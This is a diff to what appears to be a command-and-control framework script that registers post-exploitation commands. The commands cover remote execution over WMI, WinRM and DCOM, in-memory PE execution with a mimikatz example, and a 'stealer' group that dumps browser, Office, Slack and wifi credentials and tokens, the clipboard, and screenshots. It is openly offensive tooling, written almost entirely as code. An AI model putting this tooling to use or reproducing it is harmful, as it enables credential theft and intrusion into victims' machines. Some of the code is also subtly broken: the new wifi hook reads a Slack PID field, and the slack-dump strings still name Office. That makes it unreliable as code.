@@ -83,22 +83,6 @@ cmd_rmt_exec_dcom.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
 let cmd_rmt_exec = ax.create_command("remote-exec", "Execute commands on remote machines via WMI, WinRM, SCM, or DCOM");
 cmd_rmt_exec.addSubCommands([cmd_rmt_exec_winrm, cmd_rmt_exec_wmi, cmd_rmt_exec_scm, cmd_rmt_exec_dcom]);
 
-let cmd_exec_pe = ax.create_command("pe", "Execute Portable Executable PE (.exe, .dll), just use in console PE", "execute pe -f /opt/mimikatz.exe -a \"privilege::debug\" -e DllMain", "Task: execute portable executable");
-cmd_exec_pe.addArgFlagFile("-f", "pe_file", true, "Path to compiled PE");
-cmd_exec_pe.addArgFlagString("-a", "pe_args", false, "Arguments to pass for PE");
-cmd_exec_pe.addArgFlagString("-e", "dll_export", false, "Execute exported function (Dll case)");
-cmd_exec_pe.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let pe_file = parsed_json["pe_file"];
-    let pe_args = parsed_json["pe_args"] || "";
-    let dll_exp = parsed_json["dll_export"] || "";
-
-    let mod_params = ax.bof_pack("bytes,cstr,cstr", [pe_file, pe_args, dll_exp]);
-    let mod_path   = ax.script_dir() + "Shellcode/Reflection/Bin/execute_pe." + ax.arch(id) + ".bin";
-    let message    = `Task: executing PE in-memory`;
-
-    ax.execute_alias(id, cmdline, `execute postex -m inline -f ${mod_path} $-a {mod_params}`, message);
-});
-
 // DOTNET
 
 let cmd_dotnet_list_v = ax.create_command("listversions", "Enumerate installed .NET Framework versions using BOF", "dotnet listversions", "Task: enumerate .NET versions");
@@ -135,9 +119,6 @@ cmd_dotnet.addSubCommands([cmd_dotnet_list_v, cmd_dotnet_inline]);
 
 // STEALER
 
-let cmd_stealer_browserdmp = ax.create_command("browser-dump", "Extract saved credentials and cookies from browser profile", "stealer browser-dump chrome", "Task: dump browser credentials and cookies");
-cmd_stealer_browserdmp.addArgString("browser_name", true, "Browser name (currently only 'chrome' is supported)");
-
 let cmd_stealer_screenshot = ax.create_command("screenshot", "Capture a screenshot of the current desktop", "stealer screenshot", "Task: capture desktop screenshot");
 cmd_stealer_screenshot.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let bof_path = ax.script_dir() + "BOF/Screenshot/Bin/screenshot." + ax.arch(id) + ".o";
@@ -145,7 +126,6 @@ cmd_stealer_screenshot.setPreHook(function (id, cmdline, parsed_json, ...parsed_
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, message);
 });
-
 
 let cmd_stealer_clipdump = ax.create_command("clipdump", "Retrieve current clipboard contents", "stealer clipdump", "Task: dump clipboard data");
 cmd_stealer_clipdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -155,7 +135,7 @@ cmd_stealer_clipdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_li
     ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, message);
 });
 
-let cmd_stealer_officedump = ax.create_command("office-dump", "Extract credentials from Microsoft Office process memory", "stealer office-dump 1234", "Task: dump Office credentials from memory");
+let cmd_stealer_officedump = ax.create_command("office-dump", "Extract tokens from Microsoft Office process memory", "stealer office-dump 1234", "Task: dump token credentials from memory");
 cmd_stealer_officedump.addArgInt("office_pid", true, "Process ID of running Office application");
 cmd_stealer_officedump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let office_pid = parsed_json["office_pid"];
@@ -167,7 +147,7 @@ cmd_stealer_officedump.setPreHook(function (id, cmdline, parsed_json, ...parsed_
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });    
 
-let cmd_stealer_slackdump = ax.create_command("slack-dump", "Extract credentials from Microsoft Office process memory", "stealer office-dump 1234", "Task: dump Office credentials from memory");
+let cmd_stealer_slackdump = ax.create_command("slack-dump", "Extract token from Slack process memory", "stealer office-dump 1234", "Task: dump Slack token from memory");
 cmd_stealer_slackdump.addArgInt("slack_pid", true, "Process ID of running Office application");
 cmd_stealer_slackdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let slack_pid = parsed_json["slack_pid"];
@@ -179,8 +159,20 @@ cmd_stealer_slackdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_l
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });    
 
+let cmd_stealer_wifi = ax.create_command("wifi", "Enumerate or Dump wifi", "stealer wifi enum", "Task: interact with wifi");
+cmd_stealer_wifi.addArgString("wifi_action", true, "Use 'enum' or 'dump [profile]'");
+cmd_stealer_wifi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let slack_pid = parsed_json["slack_pid"];
+
+    let bof_params = ax.bof_pack("int", [slack_pid]);
+    let bof_path =  ax.script_dir() + "BOF/Wifidump/Bin/wifidump." + ax.arch(id) + ".o";
+    let message = `Task: interact with wifi`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});    
+
 let cmd_stealer = ax.create_command("stealer", "Information gathering and credential extraction operations");
-cmd_stealer.addSubCommands([cmd_stealer_browserdmp, cmd_stealer_clipdump, cmd_stealer_screenshot, cmd_stealer_officedump, cmd_stealer_slackdump]);
+cmd_stealer.addSubCommands([cmd_stealer_clipdump, cmd_stealer_screenshot, cmd_stealer_officedump, cmd_stealer_slackdump, cmd_stealer_wifi]);
 
 var group_stealer  = ax.create_commands_group("Stealer Commands", [cmd_stealer]);
 var group_dotnet   = ax.create_commands_group("Dotnet Interactions", [cmd_dotnet]);
